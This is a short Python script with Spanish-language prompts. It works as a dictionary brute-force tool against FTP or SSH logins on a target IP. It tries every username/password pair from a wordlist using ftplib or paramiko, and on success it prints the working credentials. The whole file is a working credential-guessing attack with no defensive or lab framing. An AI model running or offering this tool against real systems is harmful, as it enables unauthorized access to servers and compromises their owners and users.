import ftplib
import paramiko

ip = input("Ingrese la ip objetivo:\n")
conn_serv = int(input("    1)FTP\n    2)SSH\nSelect an option:"))
assert conn_serv == 1 or conn_serv == 2, "Opción no válida, inténtelo de nuevo"
f_path = input("Ingrese la ruta al diccionario:\n")

try:
    with open(f_path, "r") as f:
        words = f.read().split("\n")
        f.close()
except Exception:
    print("Hubo un error mientras se procesaba el archivo, Compruebe que la ruta es correcta y que contiene la extensión del archivo\nSaliendo...")
    exit()

if conn_serv == 1:
    for user in words:
        for passwd in words:
            conn = ftplib.FTP(ip)
            try:
                conn.login(user, passwd)
                print(f"¡Conexión exitosa!\nUsuario: {user}\nContraseña: {passwd}")
                try:
                    conn.quit()
                    exit()
                except:
                    conn.close()
                    exit()
            except ftplib.error_perm:
                try:
                    conn.quit()
                except:
                    conn.close()

if conn_serv == 2:
    for user in words:
        for passwd in words:
            try:
                conn = paramiko.SSHClient()
                conn.load_host_keys('C:/Users/Alberto/.ssh/known_hosts')
                conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                conn.connect(ip, username=user, password=passwd)
                print(f"¡Conexión exitosa!\nUsuario: {user}\nContraseña: {passwd}")
                conn.close()
                exit()
            except paramiko.ssh_exception.AuthenticationException:
                conn.close()